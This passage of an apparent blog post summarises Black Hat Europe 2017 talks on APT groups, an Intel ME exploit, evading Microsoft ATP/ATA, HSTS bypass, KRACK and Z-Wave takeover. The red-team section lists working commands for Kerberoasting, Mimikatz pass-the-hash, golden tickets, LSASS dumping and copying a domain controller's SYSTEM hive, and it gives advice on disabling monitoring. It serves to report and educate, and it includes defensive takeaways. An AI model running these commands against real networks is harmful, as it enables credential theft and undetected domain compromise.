+
+<p><img src="/img/bheu2017/apt6.png" alt="" /></p>
+
+<p><img src="/img/bheu2017/apt7.png" alt="" /></p>
+
+<p>Personal point of view, malware developed by those groups are not “complicated”. They’re not (or few) obfuscated, the real exploit is the recon step.</p>
+
+<p>They can use cryptocurrencies to buy C&amp;C server, to be more difficult to find. Bitcoin obtained via stole or ransomed action.</p>
+
+<p>According to McAfee, Lazarus moved to mobile platforms (2). Unit 42 from Palo Alto discovered a cluster of malware, which targets Samsung devices and Korean Languages speakers (3).</p>
+
+<p>Andariel acts during company activity, to be quieter during the attack.</p>
+
+<p><strong>From a personal point of view</strong>, it is pretty cool to see how this kind of attack is defeated, and how those cybercriminals planned their actions. I’m just a bit surprised by malware developed by those groups, they are not encrypted or very hard to reverse.</p>
+
+<h4 id="sources-documents-2">Sources documents</h4>
+
+<ol>
+<li>Chi-En Shen, Min-Chang Jang &amp; Kyoung-Ju Kwak, <em>Black hat presentation</em>, Wednesday, December 6, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf</a></li>
+<li>Christian Beek, <em>Lazarus Cybercrime Group Moves to Mobile Platform</em>, November 20, 2017. <a href="https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/">https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/</a></li>
+<li>Anthony Kasza, Juan Cortes, and Micah Yates, <em>Operation Blockbuster Goes Mobile</em>, November 20, 2017. <a href="https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/">https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/</a></li>
+<li>TechNet Archive, <em>Using a Host-Guest communication channel in Windows Virtual PC</em>, October 13, 2009. <a href="https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/">https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/</a></li>
+</ol>
+
+<h3 id="how-to-hack-a-turned-off-computer-or-running-unsigned-code-in-intel-management-engine">How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</h3>
+
+<blockquote>
+<p>Mark Ermolov &amp; Maxim Goryachy from Positive Technologies</p>
+</blockquote>
+
+<p>They revealed CVE-2017-5705,6,7 (3). As <em>Mark Ermolov</em> <a href="https://twitter.com/_markel___/status/938166256322129921">tweet</a> says, their vulnerability depends on MFS.</p>
+
+<p>There are few vulnerabilities in the ME, but only 1 allows execution of arbitrary code on ME! But, now, there is two.</p>
+
+<p>Potentials attack vectors:</p>
+
+<ul>
+<li><strong>Local communication interface (HECI)</strong>: Separated PCI device, it exchanges messages between the main system and the ME.</li>
+<li><strong>Network (vPro only)</strong>: ATM is a large module, so a lot of code. But only available in business systems.</li>
+<li><strong>IPMI/MCTP</strong>: ??</li>
+<li><strong>Host memory (UMA)</strong>: AES encryption with integrity checking.</li>
+<li><strong>Firmware SPI layout</strong>: Needs intel private key to exploit a bug in parsing procedure of signed data. Moreover, the firmware is not vulnerable to “evil SPI flash” attack in general.</li>
+<li><strong>Internal file system</strong>: It refers to the previous briefing by <em>imitry SKLYAROV</em></li>
+</ul>
+
+<p>The architecture of the ME shows 2 issues:</p>
+
+<ul>
+<li>A process can create another process which is more privileged than itself.</li>
+<li>Access to internal devices completely breaks the security model.</li>
+</ul>
+
+<p>In high privileged modules, we meet <strong>BUP</strong>, as we saw with first ME briefing.</p>
+
+<p><strong>BUP</strong> can create a child process, and of course, choose its privilege. Also, this module exists on all platforms, has access to security sensitive hardware, can bypass MFS protection, one of the largest modules (more code = more attack vector) and interacts with the host via HECI.</p>
+
+<p>In the processing of reverse engineering, they find a buffer overflow vulnerability in the <strong>Trace hub initialization</strong>. Here is the function code:</p>
+
+<pre><code>void __cdecl bup_init_trace_hub ()
+{
+    int err; // eax 
+    eax signed int npk_reg_idx; // ebx 
+    ebx unsigned int bytes_read; // [esp+0h] [ebp-350 h]
+    unsigned int file_size; // [esp+4h] [ebp-34 Ch] 
+    int si_features[5]; // [esp+8h] [ebp-348 h] 
+    int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes 
+    int cookie; // [esp+344h] [ebp - Ch] 
+
+    cookie = gRmlbCookie;
+    memset (si_features, 0, 0x14u);
+    bytes_read = 0;
+    file_size = 0;
+    if (!(getDW_sel (0xBF,0xE0u) &amp; 0x1000000) 
+        &amp;&amp; !bup_get_si_features (si_features) 
+        &amp;&amp; !bup_dfs_get_file_size (&quot;/home/bup/ct&quot;, &amp;file_size)) {
+            if (file_size){
+                LOBYTE (err) = bup_dfs_read_file (&quot;/home/bup/ct&quot;, 0, ct_data, file_size, &amp;bytes_read);
+                npk_reg_idx = 0;
+
+                if (!err) {
+                  while (npk_reg_idx &lt; HIWORD (ct_data[1]))
+                    {
+                        if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 1)         
+                            putDW_sel (0xB7, ct_data[2 * npk_reg_idx + 2] &amp; 0xFFFFF, ct_data[2 * npk_reg_idx + 3]);
+                        if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 2)
+                            putDW_sel (0xBF, ct_data[2 * npk_reg_idx + 2] &amp; 0xFFFFF, ct_data[2 * npk_reg_idx + 3]);  
+                        ++npk_reg_idx;
+                    }
+                  bup_switch_tracer (0xB7, 0xBF u);
+                }
+            }
+        }
+  if (gRmlbCookie != cookie)
+    sys_fault ();
+}
+</code></pre>
+
+<p>So the vulnerability is here, but there is a stack protection against buffer overflow, the <strong>stack cookie</strong>:</p>
+
+<pre><code>void __cdecl bup_init_trace_hub ()
+{
+    [...]
+    int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes 
+    int cookie; // [esp+344h] [ebp - Ch] 
+
+    cookie = gRmlbCookie;
+    [...]
+    if (!(getDW_sel (0xBF,0xE0u) &amp; 0x1000000) 
+        &amp;&amp; !bup_get_si_features (si_features) 
+        &amp;&amp; !bup_dfs_get_file_size (&quot;/home/bup/ct&quot;, &amp;file_size)) {
+            if (file_size){
+                LOBYTE (err) = bup_dfs_read_file (&quot;/home/bup/ct&quot;, 0, ct_data, file_size, &amp;bytes_read);
+    [...]
+    if (gRmlbCookie != cookie) // Stack protection
+        sys_fault ();
+}
+</code></pre>
+
+<p>The <strong>/home/bup/ct</strong> is an unsigned file from <strong>fitc.cfg</strong> (cf. First presentation):</p>
+
+<p><img src="/img/bheu2017/me5.png" alt="" /></p>
+
+<p>The <em>stack cookie</em> implements:</p>
+
+<ul>
+<li>Each process has unique value for stack cookie</li>
+<li>32 bits value is obtained from hardware random number generator</li>
+<li>Stored is nonvolatile process memory</li>
+<li>If cookie changed, the process exited</li>
+</ul>
+
+<p>To bypass the protection they decided to intercept the execution flow and exploit the buffer overflow before the cookie checking.</p>
+
+<p>To do that, in the code above, we can see the <strong>bup_dfs_read_file</strong> that indirectly call a <strong>memcpy</strong> function. Then, they have the destination address of the structure they named <strong>Tread Local Storage</strong> (TLS). In <em>BUP</em> read/write functions obtains and records data via a shared memory mechanism. Because <em>BUP</em> interacts with <em>MFS</em> though another module <strong>file system driver</strong>. The TLS region can be overwritten by a read function, and then bypass the buffer overflow protection.</p>
+
+<table>
+<thead>
+<tr>
+<th>Code flow</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>bup_init_trace_hub</td>
+</tr>
+
+<tr>
+<td>bup_dfs_read_file</td>
+</tr>
+
+<tr>
+<td>bup_read_mfs_file</td>
+</tr>
+
+<tr>
+<td>sys_write_shared_mem</td>
+</tr>
+</tbody>
+</table>
+
+<p>The TLS structure looks to:</p>
+
+<p><img src="/img/bheu2017/me3.png" alt="" /></p>
+
+<p>And now, the serious problem architecture is that the TLS structure is stored at the bottom of the stack. Then you can erase the <strong>gs:[0]</strong>, the self-pointer and generate a new structure, it allows an attacker to write arbitrary data.</p>
+
+<p>Here is a diagram of the stack (from presentation (1)):</p>
+
+<p><img src="/img/bheu2017/me1.png" alt="" /></p>
+
+<p>Now, <em>Mark Ermolov &amp; Maxim Goryachy</em> tells us how to get an arbitrary write primitive. They “just” rewrite (there is no ASLR) the return address of memcpy to hijack the program control flow.</p>
+
+<p><img src="/img/bheu2017/me2.png" alt="" /></p>
+
+<p>But, <strong>Stack is nonexecutable</strong>, then they create their own module and integrate it into the firmware. This module used ROP gadgets to:</p>
+
+<ul>
+<li>Load the module into memory</li>
+<li>Create new process with highest privileges</li>
+</ul>
+
+<p>Is remote exploitation possible?</p>
+
+<p>Yes, if:</p>
+
+<ul>
+<li>AMT is enabled and attacker known password (or use CVE-2017-5689)</li>
+<li>BIOS has “Flash rewrite enable” option</li>
+<li>BIOS password is blank or known</li>
+</ul>
+
+<p>Updates systems are not out of danger because the firmware downgrade to a vulnerable version is possible, but it needs a physical access to the target.</p>
+
+<p>TLS is still at the same place, even after the update.</p>
+
+<p><strong>From a personal point of view</strong>, this presentation was just awesome, it’s the presentation that I enjoyed the most. I think in my final year at school, I will take the Intel ME as a research paper.</p>
+
+<p>During Demo Time, they played a video showing a big “GAME OVER” blinking on the screen at boot (not at windows boot, at computer boot, so we could see the message before the loading screen of Windows).</p>
+
+<h4 id="sources-documents-3">Sources documents</h4>
+
+<ol>
+<li>Mark Ermolov &amp; Maxim Goryachy, <em>Black hat presentation</em>, Wednesday, December 6, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf</a></li>
+<li>Mark Ermolov &amp; Maxim Goryachy, <em>[Paper] How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</em>. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf</a></li>
+<li>CVE-2017-5705, <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5705">https://nvd.nist.gov/vuln/detail/CVE-2017-5705</a></li>
+<li>CVE-2017-5706, <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5706">https://nvd.nist.gov/vuln/detail/CVE-2017-5706</a></li>
+<li>CVE-2017-5707, <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5707">https://nvd.nist.gov/vuln/detail/CVE-2017-5707</a></li>
+<li>CVE-2017-5689, <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5689">https://nvd.nist.gov/vuln/detail/CVE-2017-5689</a></li>
+</ol>
+
+<h3 id="goodies-hunting-part-1">Goodies hunting part 1</h3>
+
+<p>At the end of the first day, with <a href="https://twitter.com/razaborg">@razaborg</a> we tried some challenge offered by companies in the business hall, and getting some goodies!</p>
+
+<p>The challenge tested (by a company whose I forgot the name, really sorry :X), was an IP camera inside a box with digital code protection. Numbers were hidden on the presentation stand, we find 3 on the 6, not enough, unfortunately…</p>
+
+<h2 id="day-2">Day 2</h2>
+
+<h3 id="red-team-techniques-for-evading-bypassing-and-disabling-ms-advanced-threat-protection-and-advanced-threat-analytics">Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics</h3>
+
+<blockquote>
+<p>Chris THOMPSON (@retBandit) from IBM X-Forced Red</p>
+</blockquote>
+
+<p>Step in a red team mission:</p>
+
+<ul>
+<li>External recon</li>
+<li>Gain a Foothold</li>
+<li>Host recon</li>
+<li>Internal recon</li>
+<li>Lateral movement</li>
+<li>Dominance</li>
+</ul>
+
+<p>Obfuscated PowerShell script triggered Advanced Threat Protection (ATP). ATP includes machine learning and AMSI.</p>
+
+<blockquote>
+<p>Defender ATP =/= Defender AV</p>
+</blockquote>
+
+<p>Misc techniques to gain the initial foothold: * Obfuscated JScript/VBScript THAT DON’T USE <strong>KERNEL32 API</strong>. * Using signed exec’s to load a Cobalt stageless payload. * Some executables created with Veil (Go) and Shellter.</p>
+
+<p><strong>Not detected</strong>: WMI</p>
+
+<pre><code>wmic process list brief
+wmic group list brief
+wmic computersystem list
+wmic process list /format:list
+wmic ntdomain list /format:list
+wmic useraccount list /format:list
+wmic group list /format:list
+wmic sysaccount list /format:list
+wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
+Get-WmiObject -Class Win32_UserAccount -Filter &quot;LocalAccount='True'&quot;
+</code></pre>
+
+<p>Use MSF modules with local WinAPI calls, such as <strong>file_from_raw_ntfs.rb</strong>, don’t use <strong>local_admin_search_enum.rb</strong>.</p>
+
+<p>CobaltStrike has a number of modules that are API-only.</p>
+
+<p><strong>Avoid AMSI</strong></p>
+
+<p>Userland Persistence and AMSI Bypass via Component Object Model Hijacking.</p>
+
+<p>ATP can’t be stopped or uninstalled, even with a SYSTEM account, because of Protected Process Light.</p>
+
+<p>But it’s possible to block ATP communications via DiagTrack Service. Hijack DLL to remove PPL protection? (personal note: not sure)</p>
+
+<p>Mimikatz driver is registered as malicious now, but you change the service name and re-sign it.</p>
+
+<p>It’s possible to block all Windows Defender/ATP Comms via Firewall (1 page 42)</p>
+
+<p><strong>Not detected</strong>: Using LDAP/Powerview to gather computers/users.</p>
+
+<pre><code>Get-NetComputer -verbose -domain prod.local
+Get-NetGroupMember -GroupName &quot;Enterprise Admins&quot; -Domain dev.local -verbose
+</code></pre>
+
+<p><strong>Not detected</strong>: Enumeration via WMI Local Name Space</p>
+
+<p>Domain User Accounts:</p>
+
+<pre><code>Get-WmiObject -Class Win32_UserAccount -Filter &quot;Domain='dev' AND Disabled='False'&quot; | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired, PasswordChangeable, Description, SID
+</code></pre>
+
+<p>Domain Groups:</p>
+
+<pre><code>Get-ComInstance -ClassName Win32_Group -Filter &quot;Domain = 'dev' AND Name like '%Admin%'&quot;
+</code></pre>
+
+<p>Domain Group User Memberships:</p>
+
+<pre><code>Get-CimInstance -ClassName Win32_Group -Filter &quot;Domain = 'dev' AND Name='Enterprise Admins'&quot; | Get-CimAssociatedInstance - Association Win32_GroupUser
+
+Get-CimInstance -ClassName Win32_Group -Filter &quot;Domain = 'dev' AND Name='Microsoft Advanced Threat Analytics Administrator'&quot; | Get-CimAssociatedInstance - Association Win32_GroupUser
+</code></pre>
+
+<p><strong>Not detected</strong>: SPN Enumeration &amp; Kerberoasting</p>
+
+<pre><code>Get-NetComputer -SPN mssql*
+Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat
+</code></pre>
+
+<p><strong>Not detected</strong>: Silver ticket</p>
+
+<p>The golden ticket is a forged TGT, Silver ticket is a forged TGS. No DC server contacted.</p>
+
+<p><strong>Not detected</strong>: Enumerating AD Access Control Entries</p>
+
+<pre><code>Invoke-BloodHound -CollectionMethod ACL -ExcludeDC
+</code></pre>
+
+<p><strong>Not detected</strong>: Escalation via Selective AD ACL Abuse</p>
+
+<pre><code>&gt;Add-DomainGroupMember -Identity sql01admins -Members edwardabbey
+
+&gt; Set-DomainUserPassword -Identity webservice -AccountPassword$Password
+</code></pre>
+
+<p>Over-Pass-The-Hash is detected using KRBTGT NTLM hash.</p>
+
+<p><strong>Not detected</strong>: Over-Pass-The-Hash using all hash/keys.</p>
+
+<p>In a mimikatz console:</p>
+
+<pre><code>sekurlsa::pth /user:administrator /domain:prod.local /aes256:&lt;data&gt; /ntlm:&lt;hash&gt; /aes128:&lt;data&gt;
+</code></pre>
+
+<p>Lateral movement via SQL Auth is not detected.</p>
+
+<p>For the dominance.</p>
+
+<p><strong>Not detected</strong>: PowerSploit: Mimikatz in memory w/ LSASS injection</p>
+
+<pre><code>Invoke-Mimikatz -Command '&quot;privilege::debug&quot; &quot;LSADump::LSA /inject&quot;' -Computer dc03.prod.local
+</code></pre>
+
+<p><strong>Not detected</strong>: PowerSploit: Ninja-Copy (PSRemoting with Raw Disk Access)</p>
+
+<pre><code>Invoke-NinjaCopy -Path &quot;c:\Windows\System32\config\SYSTEM&quot; -ComputerName &quot;dc03.prod.local&quot; -LocalDestination &quot;c:\temp\system&quot;
+</code></pre>
+
+<p><strong>Not detected</strong>: Golden ticket w/ AES Key</p>
+
+<p>In mimikatz console:</p>
+
+<pre><code>kerberos::golden /user:JohnVanwagoner /domain:prod.local /sid:sid /aes256:aes256 /groups:512,513,519 /startoffset:-1 /endin:2500 /renewmax:3000 /ptt
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Red Team Takeaways</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Return to living off the land, directly call APIs</td>
+</tr>
+
+<tr>
+<td>Leverage host based PowerShell tools only after you&rsquo;ve blocked or disabled ATP &amp; event log forwarding</td>
+</tr>
+
+<tr>
+<td>Review RDP/PS/Session history to help avoid user behavior analytics</td>
+</tr>
+
+<tr>
+<td>Block event log forwarding to prevent Sysmon/WMI/PowerShell/Security logs giving you away</td>
+</tr>
+
+<tr>
+<td>Use ACE/DACL abuse to help avoid using RCE when possible</td>
+</tr>
+
+<tr>
+<td>Focus on info gathering and lateral movement techniques that don&rsquo;t comm with the DC, liks SQL auth and Silver Tickets</td>
+</tr>
+
+<tr>
+<td>Kerberoast &amp; Silver Ticket all the things</td>
+</tr>
+
+<tr>
+<td>Use AES for Over-PTH, Golden Tickets</td>
+</tr>
+
+<tr>
+<td>Abuse Forest Trusts</td>
+</tr>
+</tbody>
+</table>
+
+<table>
+<thead>
+<tr>
+<th>Blue Team Takeaways</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Limit PS Remoting sources to dedicated admin workstations</td>
+</tr>
+
+<tr>
+<td>Use JEA (Just Enough Administration) to help prevent lateral movement success</td>
+</tr>
+
+<tr>
+<td>Harden SQL servers, review forest trusts</td>
+</tr>
+
+<tr>
+<td>Integrate SIEM/VPN logs into ATA</td>
+</tr>
+
+<tr>
+<td>Use Event Log Forwarding for Sysmon and WMI logging with shorter polling times</td>
+</tr>
+
+<tr>
+<td>Audit your AD object ACLs with BloodHound</td>
+</tr>
+
+<tr>
+<td>Enforce AES-256, especially for service account SPNs</td>
+</tr>
+
+<tr>
+<td>Enforce &ldquo;Binary Signature Policy&rdquo; in 1703 to help protect PPLs</td>
+</tr>
+
+<tr>
+<td>Integrate those new Defender branded tools like Exploit Guard (WDEG)</td>
+</tr>
+
+<tr>
+<td>Enforce EMET/WDEG&rsquo;s Attack Surface Reduction (ASR) rules</td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>From a personal point of view</strong>, being a pentester, this presentation was one of the most interesting. I didn’t even know ATA and ATP before the briefing. Maybe I will build a little lab to test all of this.</p>
+
+<h4 id="source-documents">Source documents</h4>
+
+<ol>
+<li>Chris THOMPSON, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf</a></li>
+<li>Andy Robbins, <em>[GitHub] BloodHoundAD</em>, September 19, 2016. <a href="https://github.com/BloodHoundAD/Bloodhound/wiki">https://github.com/BloodHoundAD/Bloodhound/wiki</a></li>
+</ol>
+
+<h3 id="breaking-out-hsts-and-hpkp-on-firefox-ie-edge-and-possibly-chrome">Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome</h3>
+
+<blockquote>
+<p>Sheila Ayelen Berta &amp; Sergio De Los Santos from ElevenPaths</p>
+</blockquote>
+
+<p>Most of the MITM attacks doesn’t work anymore today. That’s why HSTS and HPKP are created.</p>
+
+<p>When a user is connected to an HSTS website, the first time the client connects to the port 80 of the website and he is redirected to the 443 port. With HSTS, next time client connects to the website, it will be automatically on the 443 port, then SSLStrip is useless.</p>
+
+<p>HPKP will get the certificate signature, or “certificate pinning” and compares it at every connection. If the signature is modified, then the browser drop the connection.</p>
+
+<h4 id="firefox">Firefox</h4>
+
+<p>To remember which site has HSTS and who is the owner of each certificate signature, Firefox uses a small text file (SiteSecurityServiceState.txt). In the Firefox source code, this plain text file can take 1024 entries maximum.</p>
+
+<p>With <strong>cloudspinning</strong> researchers sent a lot of HSTS data to the target Firefox. When 1024 entries are exceeded, the original results in the plain text are erased.</p>
+
+<p>Then the client will need to go to the 80 port again, and if you start SSLStrip at the right moment, you’re MITM is perfectly performed.</p>
+
+<p>To playing with the <strong>Score</strong> columns, you can use the Delorean script (2).</p>
+
+<h4 id="chrome">Chrome</h4>
+
+<p>Chrome runs the same system as Firefox, but there is no limit on this text file. <strong>Problem solved?</strong> Not really…</p>
+
+<p>Even if there is no limit, Chrome will store every result in the file. If you send a lot of requests, just as with Firefox during a couple of minutes, <sup>10</sup>&frasl;<sub>15</sub> or more, this file will become very huge (<sup>200</sup>&frasl;<sub>300</sub> Mo).</p>
+
+<p>Each request sent by Chrome is analyzed with this file to know if we can use HSTS or HPKP. Then Chrome is unusable at all, because browsing a 400 Mo file is slow! Then, you have to wipe all data.</p>
+
+<p>The same thing as Firefox, SSLStrip will work now.</p>
+
+<h4 id="internet-explorer-edge">Internet Explorer/EDGE</h4>
+
+<p>IE/EDGE doesn’t use a simple text file, they use a database. Now, there is two important point here:</p>
+
+<ul>
+<li>The lack of documentation</li>
+<li>IE does not support HPKP</li>
+</ul>
+
+<p>HSTS in IE/EDGE is managed by <strong>WinInet.dll</strong>.</p>
+
+<p>Due to problems in the storage process, not all HSTS website is remembered. Then if you clear the cache, the user hasn’t a real HSTS protection.</p>
+
+<p><strong>From a personal point of view</strong>, before this briefing I just had a little idea of how HSTS and HPKP works. The presentation was very clear and interesting.</p>
+
+<h4 id="source-documents-1">Source documents</h4>
+
+<ol>
+<li>Sheila Ayelen Berta &amp; Sergio De Los Santos, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf</a></li>
+<li>PentesterES, <em>[GitHub] Tools to bypass FF, Chrome and IE HSTS/HPKP protection</em>. <a href="https://github.com/PentesterES/Delorean">https://github.com/PentesterES/Delorean</a></li>
+</ol>
+
+<h3 id="key-reinstallation-attacks-breaking-the-wpa2-protocol">Key Reinstallation Attacks: Breaking the WPA2 Protocol</h3>
+
+<blockquote>
+<p>Mathy Vanhoef from KU Leuven</p>
+</blockquote>
+
+<p>In the WPA2 process, there are 3 step:</p>
+
+<ol>
+<li>Pairing step</li>
+<li>4-Way Handshake</li>
+<li>Group Key Handshake</li>
+</ol>
+
+<p>The KRACK vulnerability is in the 4-Way Handshake. Here is a standard 4-Way Handshake:</p>
+
+<p><img src="/img/bheu2017/krack1.png" alt="" /></p>
+
+<ul>
+<li>PTK = PRF(PMK, ANonce, SNonce, MAC client, MAC point d’accès)</li>
+<li>PRF: Hashing function based on HMAC using SHA1</li>
+<li>PMK: hash(SSID + Access point key)</li>
+<li>Packet Number (PN): Incremental counter initialized to 0 at the beginning of the 4-Way Handshake, used to generate PMK.</li>
+</ul>
+
+<p>According to the <em>802.11r: FT - Fast Basic Service State Transition</em></p>
+
+<p>If the access point never receives the last transmission of the 4-Way Handshake, it has to resend first message (ANonce + Access point MAC) and third message (“I generated the PTK!”). Each third message received by the client, it has to update the PN counter with the one received by the access point.</p>
+
+<p>If an attacker intercepts the fourth message, then the client will continue to communicate normally (encrypted communication), but after few moment the access point will timeout and resend 1st en 3rd transmission. According to the norms, the client will reinstall the PN counter.</p>
+
+<p>WPA2 cipher broken. After that, it’s easy to decrypt the network flow. Because GCMP and TKIP allow injection and forge of the new packet, then you can forge known packet and send him to the access point or client and received the encrypted packet.</p>
+
+<p>Then:</p>
+
+<ul>
+<li>known_clear_packet XOR known_encrypt_packet = XOR_KEY</li>
+<li>unknown_encrypted_packet XOR XOR_KEY = unknown_clear_packet</li>
+</ul>
+
+<p>Interesting fact, the WPA_Supplicant implement in Linux and Android will not reinstall the PTK with Access point PN counter after the fourth request. It will simply erase the PTK and replace it with 0.</p>
+
+<p><a href="https://www.youtube.com/watch?v=fZ1R9RliM1w"><img src="https://img.youtube.com/vi/fZ1R9RliM1w/0.jpg" alt="krack presentation" /></a></p>
+
+<p><strong>From a personal point of view</strong>, I’m a bit frustrated by this presentation. He didn’t go very far technically, just presented his paper (available on the internet). Also, Mathy Vanhoef didn’t release his tool, maybe in the 34C3…</p>
+
+<h4 id="source-documents-2">Source documents</h4>
+
+<ol>
+<li>Mathy Vanhoef. <em>[Paper] Key Reinstallation Attack</em>, Thursday, December 7, 2017. <a href="https://papers.mathyvanhoef.com/blackhat-eu2017.pdf">https://papers.mathyvanhoef.com/blackhat-eu2017.pdf</a>.</li>
+<li>Mathy Vanhoef. <em>Krack Attack – Breaking WPA2 by forcing nonce reuse</em>, <a href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></li>
+<li>Mathy Vanhoef, <em>[GitHub] Test equipment</em>. <a href="https://github.com/vanhoefm/krackattacks-scripts">https://github.com/vanhoefm/krackattacks-scripts</a></li>
+<li>Hackndo aka Pixis. <em>[GitHub] Krack PoC</em>, <a href="https://github.com/Hackndo/krack-poc">https://github.com/Hackndo/krack-poc</a></li>
+<li>Hackndo aka Pixis, <em>KRACK casser le WPA2</em>, <a href="http://beta.hackndo.com/krack/">http://beta.hackndo.com/krack/</a></li>
+</ol>
+
+<h3 id="a-universal-controller-to-take-over-a-z-wave-network">A Universal Controller to Take Over a Z-Wave Network</h3>
+
+<blockquote>
+<p>Loïc ROUCH (speaker), Jérôme FRANÇOIS, Frédéric BECK from INRIA Nancy</p>
+</blockquote>
+
+<p>There is two mode in Z-wave: unsecure &amp; secure. <em>Loïc ROUCH</em> explains how the <em>unsecure</em> mode can be exploited to make a universal controller.</p>
+
+<p>The target network looks to:</p>
+
+<p><img src="/img/bheu2017/zwave1.png" alt="" /></p>
+
+<p>The attacker will need:</p>
+
+<ul>
+<li>Z-Wave controller</li>
+<li>DVB-T tuner</li>
+</ul>
+
+<p>There is a <strong>HomeID</strong>/<strong>NodeID</strong> for the master and only <strong>NodeID</strong> for the slave. During association and pairing, the master will send his HomeID to the slave.</p>
+
+<p>Then, the attack is based on the HomeID. You have to get it and replay it to control all associated slaves.</p>
+
+<p>The DVB-T Tuner is necessary to get the HomeID (3):</p>
+
+<pre><code>rtl_sdr -f 868420000 -s 2000000 -g 25 - | ./wave-in -u
+</code></pre>
+
+<p>First fourth bytes are the HomeID.</p>
+
+<p>Through the Backup and restore function, they restore the stolen HomeID.</p>
+
+<p>But, impersonate the new HomeID doesn’t mean that you have the control of all slave. Not yet.</p>
+
+<p>With the Z-Wave controller, you just have to scan the Network and slaves will connect to you.</p>
+
+<p><strong>From a personal point of view</strong> it was a cool presentation, unfortunately, the demonstration didn’t work. Maybe I’ll try to reproduce this later :-)</p>
+
+<h4 id="source-documents-3">Source documents</h4>
+
+<ol>
+<li>Loïc ROUCH, Jérôme FRANÇOIS &amp; Frédéric BECK, <em>[Paper] A Universal Controller to Take Over a Z-Wave Network</em>, Thursday, December 7, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network-wp.pdf</a></li>
+<li>Loïc ROUCH, Jérôme FRANÇOIS &amp; Frédéric BECK, <em>Black hat presentation</em>, Thursday, December 7, 2017. <a href="https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf">https://www.blackhat.com/docs/eu-17/materials/eu-17-Rouch-A-Universal-Controller-To-Take-Over-A-Z-Wave-Network.pdf</a></li>
+<li>Baol, <em>[GitHub] Waving-Z</em>. <a href="https://github.com/baol/waving-z">https://github.com/baol/waving-z</a></li>
+</ol>
+
+<h3 id="goodies-hunting-part-2">Goodies hunting part 2</h3>
+
+<p>With <a href="https://twitter.com/razaborg">@razaborg</a> again, we wanted to try the <strong>NCC Group</strong> challenge.</p>
+
+<p>This challenge was in 2 parts, first, we started with a commercial invoice and a QR Code. After that, NCC Group employee gave us an NFC card.</p>
+
+<p>First step:</p>
+
+<ul>
+<li>Decoding QR code</li>
+<li>Decoding Base64</li>
+<li>Replacing data with right information (found in commercial invoice)</li>
+<li>Re-encoding in Base64</li>
+<li>Re-generating the QR Code</li>
+</ul>
+
+<p>Second step:</p>
+
+<ul>
+<li>Scan NFC card</li>
+<li>Bunch of data -&gt; Dcode helps us, it was Caesar shift 10</li>
+<li>Replacing with right data (according to the commercial invoice again)</li>
+<li>Re-generation of an MD5 hash -&gt; we had to “brute-force” it.</li>
+<li>Re-shifting</li>
+<li>Flashing the NFC card</li>
